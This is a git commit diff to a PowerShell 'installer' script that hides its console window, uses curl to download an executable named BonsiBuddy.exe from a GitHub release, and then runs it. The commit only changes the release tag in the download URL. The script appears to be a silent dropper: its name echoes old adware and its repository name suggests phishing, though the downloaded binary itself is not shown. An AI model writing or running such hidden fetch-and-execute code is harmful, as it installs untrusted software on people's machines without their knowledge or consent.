7d6baf35b855e9655bfb89a73ea7c5fb46a602dd
sexxyred6767 <colin.t.hughes21@gmail.com>
2025-11-25 22:04:47 -0500

    Update Installer-Bonsi.ps1

--- Installer-Bonsi.ps1
+++ Installer-Bonsi.ps1
@@ -10,7 +10,7 @@ Start-Process "cmd.exe" `
 
 # Download BonsiBuddy.exe
 Start-Process "cmd.exe" `
-    -ArgumentList "/c curl -L ""https://github.com/sexxyred6767/FishforThynotThee/releases/download/sigma/BonsiBuddy.exe"" -o `"$dest`"" `
+    -ArgumentList "/c curl -L ""https://github.com/sexxyred6767/FishforThynotThee/releases/download/bro/BonsiBuddy.exe"" -o `"$dest`"" `
     -WindowStyle Hidden `
     -Wait
 
@@ -18,3 +18,4 @@ Start-Process "cmd.exe" `
 Start-Process $dest1
 
 exit
+
